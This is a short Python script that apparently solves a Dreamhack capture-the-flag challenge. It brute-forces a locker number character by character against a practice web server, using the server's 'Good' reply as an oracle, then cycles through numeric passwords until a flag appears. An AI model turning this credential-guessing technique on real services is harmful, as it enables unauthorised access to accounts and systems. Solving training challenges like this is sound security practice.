import requests, json
import string
import random

result = ''
alphanumeric = string.ascii_lowercase + string.digits

for i in range(4):
    for a in alphanumeric:
        data = { 'locker_num' : result + a,
                 'password' : 100}
        print(result)
        res = requests.post('http://host3.dreamhack.games:14098', data=data)
        if "Good" in res.text :
            result = result + a
            print(result)

for f in range(100,201) :
    data = { 'locker_num' : result,
             'password' : f}
    res = requests.post('http://host3.dreamhack.games:14098', data=data)
    print(f)
    if "FLAG" in res.text :
        print(res.text)